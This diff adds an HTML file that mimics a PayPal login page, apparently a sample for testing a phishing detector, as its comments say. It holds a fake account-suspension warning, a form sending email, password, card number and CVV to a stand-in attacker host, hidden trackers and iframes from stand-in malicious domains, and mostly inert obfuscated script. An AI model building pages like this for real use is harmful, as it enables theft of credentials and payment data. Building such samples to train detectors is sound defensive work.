@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PayPal - Secure Login</title>
+  <!-- Redirect trigger for detection -->
+  <meta http-equiv="refresh" content="300">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #003087 0%, #005abb 100%);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .container {
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+      width: 100%;
+      max-width: 400px;
+      padding: 40px;
+    }
+
+    .logo {
+      text-align: center;
+      margin-bottom: 30px;
+      font-size: 28px;
+      font-weight: bold;
+      color: #003087;
+    }
+
+    .warning {
+      background: #ffebee;
+      border-left: 4px solid #d50000;
+      padding: 12px;
+      margin-bottom: 20px;
+      border-radius: 4px;
+      font-size: 14px;
+      color: #c62828;
+    }
+
+    h1 {
+      font-size: 18px;
+      margin-bottom: 10px;
+      color: #333;
+    }
+
+    .urgency {
+      color: #d50000;
+      font-weight: bold;
+      margin-bottom: 15px;
+      font-size: 16px;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    input {
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 14px;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #003087;
+      box-shadow: 0 0 4px rgba(0, 48, 135, 0.2);
+    }
+
+    button {
+      padding: 12px;
+      background: #0070ba;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    button:hover {
+      background: #005990;
+    }
+
+    .links {
+      text-align: center;
+      margin-top: 15px;
+      font-size: 12px;
+    }
+
+    a {
+      color: #0070ba;
+      text-decoration: none;
+      margin: 0 5px;
+    }
+  </style>
+</head>
+<body oncontextmenu="return false">
+  <div class="container">
+    <div class="logo">PayPal</div>
+
+    <div class="warning">
+      ⚠️ <strong>URGENT:</strong> Your account has been suspended due to suspicious activity!
+    </div>
+
+    <h1>Verify Your Account Immediately</h1>
+    <p class="urgency">Please confirm your identity to restore access NOW - Limited time offer!</p>
+
+    <form action="http://evil-data-collector.fake-domain.ru/bank-steal" method="POST">
+      <!-- Hidden fields for phishing detection -->
+      <input type="hidden" name="trap1" value="1" />
+      <input type="hidden" name="source" value="paypal_clone" />
+      <input type="hidden" name="victim_id" value="auto_filled" />
+
+      <input type="email" placeholder="Email Address" required />
+      <input type="password" placeholder="Password" name="pass" required />
+      <input type="text" placeholder="Credit Card Number" name="cc" required />
+      <input type="text" placeholder="CVV" maxlength="4" required />
+
+      <button type="submit">Verify Account Immediately</button>
+    </form>
+
+    <div class="links">
+      <a href="#">Forgot password?</a> | <a href="#">Security</a> | <a href="#">Contact us</a>
+    </div>
+  </div>
+
+  <script>
+    // Obfuscated JavaScript patterns for detection
+    (function () {
+      // Pattern 1: eval usage
+      eval(atob("Y29uc29sZS5sb2coJ3RlbGVtZXRyeScpOw=="));
+
+      // Pattern 2: String obfuscation
+      var obfuscated = "\x73\x65\x6e\x64\x44\x61\x74\x61";
+
+      // Pattern 3: document.write
+      document.write("");
+
+      // Pattern 4: atob decoding
+      var decoded = atob("UGF5UGFsIENsb25l");
+
+      // Redirect attempts
+      setTimeout(function () {
+        // Simulated redirect
+        console.log("Redirect attempt tracked");
+      }, 5000);
+    })();
+  </script>
+
+  <!-- External tracking pixels (suspicious domains) -->
+  <script src="http://analytics.suspicious-tracker.ru/track.js?id=123"></script>
+  <img src="http://pixel.tracker.malicious.net/p.gif?email=user@example.com" alt="" style="display:none" />
+  <iframe src="http://iframe-tracker.evil-site.com/embed" style="display:none"></iframe>
+
+  <!-- Event listener for right-click blocking -->
+  <script>
+    document.addEventListener("contextmenu", function (e) {
+      e.preventDefault();
+      alert("Right-click is disabled on this page");
+    });
+  </script>
+</body>
+</html>
